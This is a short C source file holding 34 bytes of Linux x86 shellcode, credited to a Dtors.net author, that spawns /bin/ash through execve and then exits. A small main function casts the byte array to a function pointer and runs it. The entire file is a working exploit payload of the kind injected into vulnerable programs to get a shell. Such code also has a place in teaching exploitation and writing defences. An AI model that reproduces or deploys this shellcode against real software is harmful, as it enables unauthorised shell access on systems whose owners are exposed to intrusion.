/*
 * Linux x86 shellcode by bob from Dtors.net.
 * execve()/bin/ash; exit;
 * Total = 34 bytes.
 */



#include <stdio.h>

char shellcode[]=
		"\x31\xc0\x50\x68\x2f\x61\x73\x68\x68"
		"\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24"
		"\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd"
		"\x80\x31\xc0\xb0\x01\xcd\x80";
int
main()
{
        void (*dsr) ();
        (long) dsr = &shellcode;
        printf("Size: %d bytes.\n", sizeof(shellcode));
        dsr();
}